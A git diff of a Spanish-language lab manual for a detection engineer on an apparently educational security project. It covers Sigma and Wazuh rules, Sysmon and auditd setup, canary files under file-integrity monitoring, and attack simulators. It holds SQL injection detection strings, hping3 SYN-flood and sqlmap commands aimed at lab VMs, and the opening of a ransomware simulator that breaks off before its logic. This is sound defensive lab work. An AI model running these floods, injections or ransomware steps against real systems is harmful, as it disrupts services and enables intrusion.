@@ -1,704 +1,869 @@
-# Sprint Semana 1 — Manual de P3 (Angeles Castillo)
+# Manual P3 — Angeles Castillo (Detection + Attack Simulation)
 
-| Field | Value |
+| Campo | Valor |
 |-------|-------|
-| Owner | Angeles Castillo |
-| Rol | P3 · Detection Engineer + Deception |
-| Goal de la semana | Capa 1 (Sigma rules para ransomware + network + database + webapp) + Capa 3 (canary generator + FIM whodata) + validación con Atomic Red Team y Caldera + 2-4 PRs Sigma upstream a SigmaHQ |
-| Effort estimado | 6 horas/día × 7 días = 42 horas |
-| Pre-requisitos | Leer `docs/team/sprint-week-1-common-intro.md` y `docs/decisions/0008-multi-vector-scope-expansion.md` |
+| Rol | Owner de Layer 1 (Sigma + Wazuh), Layer 3 (Canary FIM), y todos los simuladores de ataque |
+| Owns | `detection/sigma/` · `detection/wazuh/` · `deception/canary_fim/` · `attack-simulation/` |
+| No owns | ML/LLM (P2) · SOAR/Notif (P1) · Infra (P4) |
+| Outputs blocking otros | `events:raw_wazuh` (consumido por P2) · simuladores ejecutables (consumidos por P4 en demo) |
+| Deadline | **2026-06-13 (sábado)** |
 
 ---
 
-## Antes de empezar — prerequisitos
+## 0. Tu charter
 
-### Hardware
+> Tú generas los eventos: tanto las **alertas** (Sigma rules que disparan sobre logs Wazuh, Canary FIM whodata) como los **ataques** que las disparan (ransomware simulator, DDoS con hping3/slowhttptest, SQL injection con sqlmap). Sin ti, las otras 3 capas no tienen nada que procesar.
 
-- Laptop con **8 GB RAM mínimo** (no necesitas correr VMs locales — usas el lab de P4 o sintéticos).
-- 20 GB disco libre.
-- macOS / Linux / Windows.
+### 0.1 Tu camino crítico
 
-### Software base
-
-```bash
-python3 --version    # 3.11+
-git --version
-# Editor: VSCode con extensiones YAML, Sigma syntax highlight (Microsoft Sentinel pack)
+```
+FASE 1  ──→  FASE 2  ──→  FASE 3  ──────→  FASE 4
+prereqs       Sigma rules    Wazuh manager     rehearsals UC-01..08
+Sysmon         Canary FIM     consume reglas     attack timing
+auditd         attack scripts agent → manager    contingencia
+                              eventos a Redis    video respaldo
 ```
 
-### Cuentas externas
+### 0.2 UCs que cubres directa o indirectamente
 
-- **GitHub** con fork de `SigmaHQ/sigma` (para PRs upstream).
-- Acceso al repo `EnzoOrdonez/argos` con permiso de PR.
+| UC | Tu rol |
+|----|--------|
+| UC-01 Lockbit-like | Tu Sigma firing T1486 + ML score (de P2 sobre tus eventos crudos) |
+| UC-02 Canary path | Tu Layer 3 (Canary FIM whodata) — única capa firing |
+| UC-04 Postgres attack | Tu simulador postgres_attack.py + Sigma reglas T1021 |
+| UC-06 DDoS (hping3 + slowhttptest) | Tu simulador + Sigma red |
+| UC-07 SELECT masivo (false positive) | Tu generador pgaudit + Sigma DB |
+| UC-08 SQL injection (sqlmap) | Tu simulador + Sigma DB |
 
 ---
 
-## Día 1 (Lunes) — Setup sigma-cli + Atomic Red Team
+# FASE 1 — Cimientos
 
-**Goal:** entorno listo, primera regla Sigma para `vssadmin delete shadows` escrita, convertida a Wazuh y validada localmente.
-
-**Tiempo:** 5 horas.
-
-### Paso 1.1 — Clonar repo y crear venv (15 min)
+## 1.1 Prerequisites
 
 ```bash
-cd ~/projects
-git clone https://github.com/EnzoOrdonez/argos.git
-cd argos
+python3 --version          # OUTPUT ESPERADO: Python 3.11.x
+docker --version           # OUTPUT ESPERADO: Docker version 24.x
+sudo apt list --installed 2>/dev/null | grep -E "(hping3|slowhttptest|sqlmap)"
+# OUTPUT ESPERADO (3 líneas si están; o vacío → instala en 1.2)
+```
 
+## 1.2 Instalar simuladores de ataque
+
+```bash
+# Ubuntu/Debian (en tu laptop):
+sudo apt update
+sudo apt install -y hping3 slowhttptest sqlmap
+
+# Verificar
+hping3 --version 2>&1 | head -1
+# OUTPUT ESPERADO: hping3 version 3.x
+
+slowhttptest -v 2>&1 | head -1
+# OUTPUT ESPERADO: Version 1.x
+
+sqlmap --version 2>&1 | head -1
+# OUTPUT ESPERADO: 1.x.x.x
+```
+
+## 1.3 Instalar sigma-cli para validar reglas
+
+```bash
+pip install sigma-cli pysigma pysigma-backend-wazuh
+
+sigma --version
+# OUTPUT ESPERADO: SigmaConverter v0.10.x
+```
+
+## 1.4 Clonar repo + venv
+
+```bash
+mkdir -p ~/code && cd ~/code
+git clone git@github.com:enzizoor/argos.git
+cd argos
 python3 -m venv .venv
 source .venv/bin/activate
-pip install -U pip setuptools wheel
-pip install -e ".[dev]"
-pip install sigma-cli pysigma-backend-wazuh
+pip install -e ./argos_contracts
+pip install -r detection/requirements.txt
+pip install -r attack-simulation/requirements.txt
+
+pytest detection/ attack-simulation/ -q
+# OUTPUT ESPERADO:
+# ......                                                            [100%]
+# 6 passed in 0.10s
 ```
 
-**Verificación:**
-```bash
-sigma --help
-# debe mostrar comandos: convert, check, list
-sigma list backends | grep wazuh
-# debe mostrar wazuh backend disponible
-```
-
-### Paso 1.2 — Crear estructura del módulo detection/ (10 min)
+## 1.5 Acceder al lab (P4 lo provee)
 
 ```bash
-mkdir -p detection/sigma-rules/{ransomware,network,database,webapp}
-mkdir -p detection/wazuh-rules detection/tests
-touch detection/__init__.py
-mkdir -p deception/canary_generator deception/fim-configs
+# P4 te pasa Vagrantfile + claves SSH.
+cd lab/
+vagrant ssh windows-victim
+# OUTPUT ESPERADO: PowerShell prompt en la VM Windows
+exit
+
+vagrant ssh linux-victim
+# OUTPUT ESPERADO: ubuntu@linux-victim:~$
+exit
 ```
 
-### Paso 1.3 — Fork de SigmaHQ y clonar Atomic Red Team (30 min)
+| Check Fase 1 | Esperado |
+|-------------|----------|
+| hping3, slowhttptest, sqlmap instalados | sí |
+| sigma-cli responde | sí |
+| Lab VMs accesibles vía `vagrant ssh` | sí |
+| Tests existentes pasan | sí |
+
+---
+
+# FASE 2 — Skeletons funcionales
+
+## 2.1 Sysmon en Windows victim (logs base para Sigma)
+
+### Qué estás haciendo
+
+Sysmon de Microsoft Sysinternals enriquece los Event Logs de Windows con info crítica: process create, file write, network conn, registry mods. Sin Sysmon, Sigma para Windows es ciego.
+
+### Comandos (en la VM Windows victim, via vagrant ssh)
+
+```powershell
+# Descargar Sysmon + config (Olaf Hartong sysmon-modular es estándar)
+Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\tools\Sysmon.zip
+Expand-Archive C:\tools\Sysmon.zip -DestinationPath C:\tools\Sysmon
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml -OutFile C:\tools\Sysmon\sysmonconfig.xml
+
+# Instalar (admin)
+cd C:\tools\Sysmon
+.\Sysmon64.exe -i sysmonconfig.xml -accepteula
+
+# OUTPUT ESPERADO:
+# System Monitor v14.x - System activity monitor
+# Sysmon installed.
+# SysmonDrv installed.
+# Starting SysmonDrv.
+# SysmonDrv started.
+# Starting Sysmon..
+# Sysmon started.
+
+# Verificar instalación
+Get-Service Sysmon64
+# OUTPUT ESPERADO:
+# Status   Name               DisplayName
+# ------   ----               -----------
+# Running  Sysmon64           Sysmon64
+
+# Disparar test event y verificar que aparece en EventLog
+notepad.exe ; Stop-Process -Name notepad -Force
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-List Id, TimeCreated, Message
+# OUTPUT ESPERADO:
+# Id           : 1   (Process Create)
+# TimeCreated  : ...
+# Message      : Process Create:  ...  Image: C:\Windows\System32\notepad.exe  ...
+```
+
+## 2.2 auditd en Linux victim
 
 ```bash
-# Ve a github.com/SigmaHQ/sigma, haz Fork a tu usuario
-# Clónalo en otro directorio:
-cd ~/projects
-git clone https://github.com/<tu-usuario>/sigma.git sigmahq-fork
-cd sigmahq-fork
-git remote add upstream https://github.com/SigmaHQ/sigma.git
+# En la VM linux-victim
+sudo apt update && sudo apt install -y auditd audispd-plugins
 
-# Clonar Atomic Red Team (para validar reglas)
-cd ~/projects
-git clone https://github.com/redcanaryco/atomic-red-team.git
+# Reglas mínimas para capturar exec + file writes en /var/lib/postgresql + canary paths
+sudo tee /etc/audit/rules.d/argos.rules > /dev/null << 'EOF'
+# Process exec
+-a always,exit -F arch=b64 -S execve -k argos_exec
+# Writes en directorios sensibles
+-w /var/lib/postgresql -p wa -k argos_pg
+-w /etc/passwd -p wa -k argos_passwd
+-w /opt/argos/canary -p wa -k argos_canary
+EOF
+
+sudo systemctl restart auditd
+sudo auditctl -l
+# OUTPUT ESPERADO:
+# -a always,exit -F arch=b64 -S execve -F key=argos_exec
+# -w /var/lib/postgresql -p wa -k argos_pg
+# -w /etc/passwd -p wa -k argos_passwd
+# -w /opt/argos/canary -p wa -k argos_canary
+
+# Test: tocar /etc/passwd
+sudo touch /etc/passwd
+sudo ausearch -k argos_passwd | tail -10
+# OUTPUT ESPERADO: registro reciente con type=PATH name="/etc/passwd"
 ```
 
-### Paso 1.4 — Primera regla Sigma: T1490 vssadmin (1.5 h)
+| Check (2.1-2.2) | Esperado |
+|-----------------|----------|
+| Sysmon corre en Windows victim | sí |
+| auditd reglas cargadas | `auditctl -l` muestra las 4 reglas |
+| Eventos de prueba aparecen en EventLog / ausearch | sí |
 
-Crea `detection/sigma-rules/ransomware/T1490_vssadmin_delete_shadows.yml`:
+---
+
+## 2.3 Sigma rules — Layer 1
+
+### Estructura
+
+```
+detection/sigma/rules/
+├── ransomware/
+│   ├── win_proc_create_vssadmin_delete.yml      ← T1490
+│   ├── win_file_mass_encrypt.yml                ← T1486
+│   └── lin_canary_write_unexpected_user.yml     ← T1486+T1083
+├── network/
+│   ├── ddos_syn_flood.yml                       ← T1498
+│   └── slow_http_post.yml                       ← T1499
+├── db/
+│   ├── pg_select_massive_unusual_table.yml      ← T1213
+│   └── pg_sqli_pattern.yml                      ← T1190
+└── lateral/
+    └── win_psexec_remote_admin.yml              ← T1021
+```
+
+### Ejemplo completo: `win_proc_create_vssadmin_delete.yml`
 
 ```yaml
-title: Volume Shadow Copies Deletion (vssadmin)
-id: 4a9b1c2d-5e6f-7890-abcd-ef0123456789
+title: VSS Admin Shadow Copy Deletion (Ransomware Indicator)
+id: 7c2d9e80-1f0c-4a4c-9b1f-argos001
 status: experimental
 description: |
-  Detects vssadmin.exe being used to delete Volume Shadow Copies,
-  a common ransomware pre-encryption step (T1490 Inhibit System Recovery).
+  Detects use of vssadmin.exe to delete volume shadow copies, a classic
+  pre-encryption step in ransomware (T1490 Inhibit System Recovery).
+author: ARGOS / Angeles Castillo
+date: 2026/05/24
 references:
   - https://attack.mitre.org/techniques/T1490/
-  - https://www.bleepingcomputer.com/news/security/lockbit-ransomware-deletes-shadow-copies/
-author: Angeles Castillo (ARGOS P3)
-date: 2026-05-24
-tags:
-  - attack.impact
-  - attack.t1490
-  - argos.ransomware
 logsource:
   product: windows
-  category: process_creation
+  service: sysmon
 detection:
   selection:
+    EventID: 1
     Image|endswith: '\vssadmin.exe'
     CommandLine|contains|all:
       - 'delete'
       - 'shadows'
   condition: selection
 falsepositives:
-  - Legitimate backup software using vssadmin (rare in production)
-level: high
-```
-
-**Validar con sigma-cli:**
-```bash
-sigma check detection/sigma-rules/ransomware/T1490_vssadmin_delete_shadows.yml
-# Esperado: ✅ valid Sigma rule
-```
-
-**Convertir a Wazuh:**
-```bash
-sigma convert -t wazuh -f xml \
-  detection/sigma-rules/ransomware/T1490_vssadmin_delete_shadows.yml \
-  -o detection/wazuh-rules/T1490_vssadmin_delete_shadows.xml
-cat detection/wazuh-rules/T1490_vssadmin_delete_shadows.xml
-```
-
-### Paso 1.5 — Validar con Atomic Red Team (1 h)
-
-Cada regla Sigma debe parearse con un Atomic test que la dispare. Para T1490:
-
-```bash
-# Buscar atomic tests para T1490
-grep -l "T1490" ~/projects/atomic-red-team/atomics/T1490/*
-# Esperado: vssadmin delete shadows test exists
-
-# Para correr este atomic test necesitarás coordinar con P4 que tenga la Windows VM
-# Por ahora documenta el atomic test en detection/tests/atomic_pairings.md
-```
-
-Crea `detection/tests/atomic_pairings.md`:
-
-```markdown
-# Sigma rules ↔ Atomic Red Team pairings
-
-| Sigma rule | Atomic test | Status |
-|------------|-------------|--------|
-| T1490_vssadmin_delete_shadows.yml | `T1490/Atomic Test #1` | Pending: needs Windows VM (P4) |
-```
-
-### Paso 1.6 — Commit + PR (10 min)
-
-```bash
-git checkout -b feature/p3/sigma-ransomware-batch1
-git add detection/
-git commit -m "feat(p3): primera regla Sigma T1490 vssadmin + wazuh conversion"
-git push origin feature/p3/sigma-ransomware-batch1
-```
-
-### Verificación EOD Día 1
-
-- [ ] `sigma --help` funciona
-- [ ] 1 regla Sigma valid + convertida a Wazuh
-- [ ] PR abierto
-
----
-
-## Día 2 (Martes) — 4 reglas más de ransomware
-
-**Goal:** 5 reglas Sigma core para ransomware mappeadas a las técnicas MITRE T1486, T1083, T1562.001, T1021, T1071.
-
-**Tiempo:** 6 horas.
-
-### Paso 2.1 — T1486 Mass file encryption (1 h)
-
-`detection/sigma-rules/ransomware/T1486_mass_file_encryption_extension.yml`:
-
-```yaml
-title: Mass File Renames to Ransomware Extension
-id: <generate uuid4>
-status: experimental
-description: |
-  Detects mass file rename operations to known ransomware extensions
-  (.locked, .crypt, .enc, .lockbit, etc.) within a short time window.
-references:
-  - https://attack.mitre.org/techniques/T1486/
-author: Angeles Castillo
-date: 2026-05-24
+  - Legitimate admin removing old shadow copies (manual; check user context).
+level: critical
 tags:
   - attack.impact
-  - attack.t1486
-logsource:
-  product: windows
-  category: file_event
-detection:
-  selection:
-    EventID: 11   # Sysmon FileCreate
-    TargetFilename|endswith:
-      - '.locked'
-      - '.lockbit'
-      - '.crypt'
-      - '.enc'
-      - '.aes'
-      - '.ryk'
-  timeframe: 60s
-  condition: selection | count() > 20
-level: critical
+  - attack.t1490
 ```
 
-### Paso 2.2 — T1083 File enumeration burst (1 h)
+### Ejemplo: `pg_select_massive_unusual_table.yml`
 
 ```yaml
-title: Suspicious File Enumeration Burst
-description: Process enumerating >1000 files in user directory in <30s
-detection:
-  selection:
-    EventID: 11
-    TargetFilename|contains: '\Documents\'
-  timeframe: 30s
-  condition: selection | count() by Image > 1000
-level: medium
-```
-
-### Paso 2.3 — T1562.001 Disable Defender (45 min)
-
-```yaml
-title: Windows Defender Disabled
-detection:
-  selection:
-    Image|endswith:
-      - '\powershell.exe'
-      - '\cmd.exe'
-    CommandLine|contains|all:
-      - 'Set-MpPreference'
-      - '-DisableRealtimeMonitoring'
-      - '$true'
-  condition: selection
-level: high
-```
-
-### Paso 2.4 — T1021 SMB lateral movement (45 min)
-
-```yaml
-title: SMB Lateral Movement Indicator
-detection:
-  selection:
-    EventID: 3
-    DestinationPort: 445
-    DestinationIp|cidr: '10.0.0.0/24'
-  condition: selection | count() by SourceIp > 5
-timeframe: 60s
-level: medium
-```
-
-### Paso 2.5 — T1071 Beacon C2 (45 min)
-
-```yaml
-title: Suspicious Outbound HTTP Beacon Pattern
-detection:
-  selection:
-    EventID: 3
-    Initiated: true
-    DestinationPort: 443
-  filter:
-    Image|endswith:
-      - '\chrome.exe'
-      - '\firefox.exe'
-      - '\edge.exe'
-  condition: selection and not filter | count() by Image > 30
-timeframe: 5min
-level: low
-```
-
-### Paso 2.6 — Convertir todas a Wazuh + tests (1 h)
-
-```bash
-for f in detection/sigma-rules/ransomware/*.yml; do
-    name=$(basename "$f" .yml)
-    sigma convert -t wazuh -f xml "$f" -o "detection/wazuh-rules/$name.xml"
-done
-ls detection/wazuh-rules/
-# Esperado: 5 archivos XML
-```
-
-### Paso 2.7 — Commit (10 min)
-
-```bash
-git add detection/
-git commit -m "feat(p3): 4 reglas Sigma más para ransomware kill chain"
-git push
-```
-
-### Verificación EOD Día 2
-
-- [ ] 5 reglas Sigma totales, todas valid con `sigma check`
-- [ ] 5 archivos Wazuh XML en `detection/wazuh-rules/`
-
----
-
-## Día 3 (Miércoles) — Canary generator + FIM rules
-
-**Goal:** Capa 3 deception completa: generador de canary files + reglas FIM whodata.
-
-**Tiempo:** 6 horas.
-
-### Paso 3.1 — Canary generator Python (2 h)
-
-`deception/canary_generator/generator.py`:
-
-```python
-"""Genera canary files con contenido dummy realista en paths estratégicos."""
-import os
-import random
-import string
-from pathlib import Path
-from datetime import datetime
-
-
-CANARY_PROFILES = {
-    "financials_Q4_2025.xlsx": {
-        "size_kb": 24,
-        "content_seed": "PK\x03\x04",  # ZIP magic (xlsx is ZIP)
-    },
-    "passwords.txt": {
-        "size_kb": 2,
-        "content_seed": "alice@example.com:Admin1234\n",
-    },
-    "db_backup.sql": {
-        "size_kb": 156,
-        "content_seed": "-- PostgreSQL database dump\nSET statement_timeout = 0;\n",
-    },
-}
-
-
-def generate_canary(path: Path, profile_name: str) -> None:
-    profile = CANARY_PROFILES[profile_name]
-    seed = profile["content_seed"].encode()
-    target_size = profile["size_kb"] * 1024
-    padding = target_size - len(seed)
-
-    path.parent.mkdir(parents=True, exist_ok=True)
-    with path.open("wb") as f:
-        f.write(seed)
-        f.write(b" " * padding)
-
-    # Antedatar el mtime para que parezca un archivo viejo
-    old_time = datetime(2024, 6, 15).timestamp()
-    os.utime(path, (old_time, old_time))
-
-
-def deploy_canaries(base_dir: Path) -> list[Path]:
-    """Deploya los 3 canaries en sub-directorios estratégicos."""
-    deployed = []
-    for name in CANARY_PROFILES:
-        target = base_dir / "Documents" / name
-        generate_canary(target, name)
-        deployed.append(target)
-    return deployed
-
-
-if __name__ == "__main__":
-    import sys
-    base = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/tmp/argos-canaries-test")
-    deployed = deploy_canaries(base)
-    for p in deployed:
-        print(f"Deployed: {p} ({p.stat().st_size} bytes)")
-```
-
-**Test:**
-```bash
-python -m deception.canary_generator.generator /tmp/argos-canaries-test
-ls -la /tmp/argos-canaries-test/Documents/
-```
-
-### Paso 3.2 — FIM whodata config (1.5 h)
-
-`deception/fim-configs/wazuh-fim-canary-windows.xml`:
-
-```xml
-<!-- Wazuh syscheck config for canary monitoring (Windows) -->
-<syscheck>
-  <directories check_all="yes" realtime="yes" whodata="yes" report_changes="yes">
-    C:\Users\Demo\Documents\financials_Q4_2025.xlsx,
-    C:\Users\Demo\Documents\passwords.txt,
-    C:\Users\Demo\Documents\db_backup.sql
-  </directories>
-</syscheck>
-```
-
-`deception/fim-configs/wazuh-fim-canary-linux.xml`:
-
-```xml
-<syscheck>
-  <directories check_all="yes" realtime="yes" whodata="yes" report_changes="yes">
-    /var/backups/postgres/db_backup.sql,
-    /home/argos-demo/Documents/financials_Q4_2025.xlsx,
-    /home/argos-demo/Documents/passwords.txt
-  </directories>
-</syscheck>
-```
-
-### Paso 3.3 — Wazuh custom rule canary fire (1 h)
-
-`detection/wazuh-rules/canary_access.xml`:
-
-```xml
-<group name="argos,canary,">
-  <rule id="100100" level="12">
-    <if_sid>550,553,554</if_sid>  <!-- syscheck-related Wazuh internal rules -->
-    <match>db_backup.sql|passwords.txt|financials_Q4_2025.xlsx</match>
-    <description>ARGOS canary file accessed — possible ransomware activity</description>
-    <mitre>
-      <id>T1486</id>
-    </mitre>
-  </rule>
-</group>
-```
-
-### Paso 3.4 — Commit (10 min)
-
-```bash
-git add deception/ detection/wazuh-rules/canary_access.xml
-git commit -m "feat(p3): canary generator + FIM whodata + Wazuh custom rule"
-git push
-```
-
-### Verificación EOD Día 3
-
-- [ ] `python -m deception.canary_generator.generator /tmp/test` crea 3 archivos
-- [ ] FIM configs XML válidos
-- [ ] Custom Wazuh rule sintácticamente correcta
-
----
-
-## Día 4 (Jueves) — Reglas network para UC-06 (DDoS)
-
-**Goal:** Reglas Sigma rate-based para detectar DDoS volumetric.
-
-**Tiempo:** 6 horas.
-
-### Paso 4.1 — Investigar rate rules nativas en Wazuh (1 h)
-
-Lee la doc de Wazuh sobre `<frequency>X</frequency>` y `<timeframe>Y</timeframe>` que cuentan eventos en ventanas. Wazuh tiene rate rules nativas — no necesitas escribir Sigma para esto, escribir directamente Wazuh XML.
-
-### Paso 4.2 — Regla DDoS SYN flood (2 h)
-
-`detection/sigma-rules/network/T1498_syn_flood.yml`:
-
-```yaml
-title: TCP SYN Flood Detection
-id: <uuid>
+title: Massive SELECT on Unusual Table (Possible Data Exfil or False Positive)
+id: 1a3b5c7d-9e0f-4321-abcd-argos007
 status: experimental
-description: Detects excessive SYN packets to a single destination port (T1498 Direct Network Flood)
-tags:
-  - attack.impact
-  - attack.t1498.001
-logsource:
-  product: linux
-  service: iptables
-detection:
-  selection:
-    log_msg|contains: 'TCP SYN'
-  timeframe: 10s
-  condition: selection | count() by DESTINATION_IP > 1000
-level: critical
-```
-
-Más una rule Wazuh directa para HTTP flood:
-
-`detection/wazuh-rules/network_flood.xml`:
-
-```xml
-<group name="argos,network,ddos,">
-  <rule id="100200" level="10" frequency="500" timeframe="10">
-    <if_matched_sid>31100</if_matched_sid>  <!-- Wazuh's HTTP access rule -->
-    <description>Possible HTTP flood: >500 requests in 10s from same IP</description>
-    <mitre>
-      <id>T1498</id>
-    </mitre>
-  </rule>
-</group>
-```
-
-### Paso 4.3 — Validar con hping3 (coordinar con P4) (1 h)
-
-P4 lanza desde otra máquina:
-```bash
-sudo hping3 --flood --syn -p 80 <linux-vm-ip>
-```
-
-Verificar que Wazuh dispara rule 100200 dentro de 10 segundos.
-
-### Paso 4.4 — Commit (10 min)
-
-```bash
-git add detection/sigma-rules/network/ detection/wazuh-rules/network_flood.xml
-git commit -m "feat(p3): regla DDoS SYN flood + HTTP flood rate-based"
-git push
-```
-
-### Verificación EOD Día 4
-
-- [ ] 2 reglas network creadas
-- [ ] Rule Wazuh dispara con hping3 flood
-
----
-
-## Día 5 (Viernes) — Reglas database + webapp (UC-07, UC-08)
-
-**Goal:** Reglas para query patterns sospechosos (UC-07) y SQL injection patterns (UC-08).
-
-**Tiempo:** 6 horas.
-
-### Paso 5.1 — Regla query masivo (UC-07) (2 h)
-
-`detection/sigma-rules/database/anomalous_query_pattern.yml`:
-
-```yaml
-title: Anomalous Database Query Pattern
-id: <uuid>
 description: |
-  Detects large SELECT queries (>10K rows returned, >5s duration)
-  outside business hours. Possible exfiltration or legitimate FP.
-tags:
-  - attack.collection
-  - attack.t1078
+  pgAudit reporta un SELECT que retornó > 100k filas sobre una tabla que
+  no figura en el patrón normal del usuario. UC-07 usa esto como caso de FP
+  para validar que el sistema NO escale a T0/T1 automáticamente.
 logsource:
   product: postgresql
   service: pgaudit
 detection:
   selection:
-    log_type: 'READ'
-    statement|contains: 'SELECT'
-    rows_returned: '>10000'
-  timefilter:
-    hour: '<6 OR >22'   # fuera de horario laboral 6 AM - 10 PM
-  condition: selection AND timefilter
+    audit_class: 'READ'
+    rows_returned|gte: 100000
+  filter_known:
+    relation:
+      - 'reports.daily_summary'
+      - 'analytics.weekly_kpis'
+  condition: selection and not filter_known
+falsepositives:
+  - Ad-hoc analytics queries.
 level: medium
-```
-
-### Paso 5.2 — Reglas SQL injection (UC-08) (3 h)
-
-`detection/sigma-rules/webapp/T1190_sql_injection_patterns.yml`:
-
-```yaml
-title: SQL Injection Patterns in HTTP Requests
-id: <uuid>
-description: Detects common SQL injection signatures in HTTP query parameters
 tags:
-  - attack.initial_access
-  - attack.t1190.001
-logsource:
-  category: webserver
-  product: nginx
-detection:
-  selection_keywords:
-    request|contains|any:
-      - "' OR '1'='1"
-      - "' OR 1=1--"
-      - "UNION SELECT"
-      - "' UNION SELECT NULL"
-      - "'; DROP TABLE"
-      - "WAITFOR DELAY"
-      - "SLEEP("
-      - "INFORMATION_SCHEMA"
-  condition: selection_keywords
-level: high
+  - attack.exfiltration
+  - attack.t1213
 ```
 
-### Paso 5.3 — Validar con sqlmap (coordinar con P4) (1 h)
+### Validar reglas con sigma-cli
 
-P4 ejecuta:
 ```bash
-sqlmap -u "http://<webapp>/?id=1" --batch --dbs --threads=5
+sigma check detection/sigma/rules/ --recursive
+# OUTPUT ESPERADO (sin issues):
+# Found 8 valid Sigma rules. 0 errors. 0 warnings.
+
+# Convertir a query Wazuh (formato XML rule)
+sigma convert -t wazuh -p windows_audit \
+  detection/sigma/rules/ransomware/win_proc_create_vssadmin_delete.yml
+# OUTPUT ESPERADO: bloque XML Wazuh con <rule id="..." level="12">...
 ```
 
-Verificar que dispara la regla.
-
-### Paso 5.4 — Commit (10 min)
-
-### Verificación EOD Día 5
-
-- [ ] 2 reglas database/webapp creadas
-- [ ] sqlmap dispara la regla SQLi
+| Check (2.3) | Esperado |
+|-------------|----------|
+| `sigma check` reporta 0 errors | sí |
+| Cada rule tiene `title`, `id`, `level`, `tags` con MITRE | sí |
+| Conversion a Wazuh produce XML válido | sí |
 
 ---
 
-## Día 6 (Sábado) — PRs upstream a SigmaHQ
+## 2.4 Canary FIM whodata (Layer 3)
 
-**Goal:** Abrir 2-4 PRs en `SigmaHQ/sigma` con las reglas más generalizables.
+### Qué estás haciendo
 
-**Tiempo:** 6 horas.
+Crear archivos "canary" en directorios trap. Wazuh FIM con módulo `whodata` captura el evento de modificación junto con el **usuario** y **proceso** que lo tocó. Cualquier escritura a un canary = compromiso confirmado (alto valor, bajo FP).
 
-### Paso 6.1 — Identificar reglas upstream-worthy (1 h)
+### Procedimiento
 
-Las reglas más generalizables (no específicas a ARGOS):
-- T1490 vssadmin delete shadows (clásica, puede tener una en SigmaHQ ya — verificar)
-- T1486 mass file rename to ransomware extension
-- T1562.001 Defender disabled via PowerShell
-
-### Paso 6.2 — Adaptar a estándares SigmaHQ (2 h)
-
-Cada regla debe tener:
-- UUID único
-- `references` con URLs públicos
-- `author` con tu nombre
-- `falsepositives` exhaustivo
-- Sin tags `argos.*` (eliminar tags privados)
-
-### Paso 6.3 — Abrir PRs (2 h)
-
-En tu fork SigmaHQ:
 ```bash
-cd ~/projects/sigmahq-fork
-git checkout -b argos/T1490-vssadmin-delete-shadows
-cp ../argos/detection/sigma-rules/ransomware/T1490_vssadmin_delete_shadows.yml rules/windows/process_creation/proc_creation_win_vssadmin_delete_shadows_argos.yml
-# Editar para quitar tags argos.* y ajustar al estilo SigmaHQ
-git commit -m "rules(windows): add vssadmin delete shadows detection"
-git push origin argos/T1490-vssadmin-delete-shadows
-# Abrir PR en github.com/SigmaHQ/sigma
+# En linux-victim
+sudo mkdir -p /opt/argos/canary
+sudo tee /opt/argos/canary/finance_2026_Q1.xlsx > /dev/null << 'EOF'
+THIS IS A CANARY FILE - DO NOT MODIFY
+ARGOS will trigger an alert on any write/modify event.
+EOF
+sudo tee /opt/argos/canary/passwords_backup.txt > /dev/null << 'EOF'
+ARGOS canary file. Touching this is malicious.
+EOF
+sudo chmod 644 /opt/argos/canary/*
+sudo chattr +a /opt/argos/canary/finance_2026_Q1.xlsx  # append-only attrib
 ```
 
-### Paso 6.4 — Documentar PRs (30 min)
+### Configurar Wazuh agent FIM whodata (en `/var/ossec/etc/ossec.conf`)
 
-`detection/tests/upstream_prs.md`:
-
-```markdown
-# SigmaHQ upstream PR tracker
-
-| PR # | Rule | Status | Reviewer feedback |
-|------|------|--------|------------------|
-| SigmaHQ/sigma#XXXX | T1490 vssadmin delete shadows | Open | Pending |
-| SigmaHQ/sigma#YYYY | T1486 mass file rename | Open | Pending |
+```xml
+<syscheck>
+  <directories whodata="yes" report_changes="yes" check_all="yes" realtime="yes">/opt/argos/canary</directories>
+  <skip_nfs>yes</skip_nfs>
+  <frequency>30</frequency>
+</syscheck>
 ```
 
-### Verificación EOD Día 6
+```bash
+sudo systemctl restart wazuh-agent
+sudo grep -i whodata /var/ossec/logs/ossec.log | tail -5
+# OUTPUT ESPERADO:
+# ... INFO: (6921): Whodata engine started.
+```
 
-- [ ] 2-4 PRs abiertos en SigmaHQ
-- [ ] Tracker documentado
+### Test: modificar y verificar alerta
+
+```bash
+# Como atacante simulado:
+echo "tampered" | sudo tee -a /opt/argos/canary/passwords_backup.txt
+
+# En el manager Wazuh (lab-manager): verificar evento
+sudo tail -50 /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id=="554")'
+# OUTPUT ESPERADO (rule 554 = "File modified by..."):
+# {
+#   "rule": { "id": "554", "level": 7, ... },
+#   "syscheck": {
+#     "path": "/opt/argos/canary/passwords_backup.txt",
+#     "audit": { "user_name": "root", "process_name": "/usr/bin/tee", ... }
+#   }
+# }
+```
+
+| Check (2.4) | Esperado |
+|-------------|----------|
+| Whodata engine arranca en el agent | sí |
+| Modificar un canary genera evento con `audit.user_name` y `audit.process_name` | sí |
+| Falso positivo rate ≈ 0 (nadie debería tocar canaries) | sí |
 
 ---
 
-## Día 7 (Domingo) — Rehearsals + iteración
+## 2.5 Attack simulator: ransomware (UC-01, UC-02, UC-04)
 
-**Mañana:** Rehearsals con P4 ejecutando los 5 simuladores. Verificar cada regla dispara correctamente.
+### Código central (`attack-simulation/ransomware_simulator/lockbit_like.py`)
 
-**Tarde:** Bug fixing — reglas que no disparan, falsos positivos descubiertos en baseline benigno.
+```python
+# attack-simulation/ransomware_simulator/lockbit_like.py
+"""
+Simulador de ransomware estilo LockBit (educacional).
 
-**Noche:** Status update.
+NO hace daño real: trabaja sobre /opt/argos/sandbox/ y los archivos cifrados
+quedan en .argos_locked. Es reversible con la clave que el script imprime al
+final (en `--variant uc01` se ejecuta el delete de shadow copies pero solo
+loguea sin ejecutar el comando real).
 
-### Entregable EOD Día 7
+Variantes:
+    uc01 — encryption masiva + vssadmin shadow delete (3 capas firing)
+    uc02 — solo toca canaries (Layer 3 sola firing)
+    uc04 — postgres_attack (T1190 + lateral) — implementado en postgres_attack.py
+"""
 
-- [ ] ~10 reglas Sigma totales (5 ransomware + 2 network + 1 database + 2 webapp)
-- [ ] 2-4 PRs upstream abiertos
-- [ ] FIM whodata configurado y disparando
+from __future__ import annotations
+
+import argparse, secrets, time
+from pathlib import Path
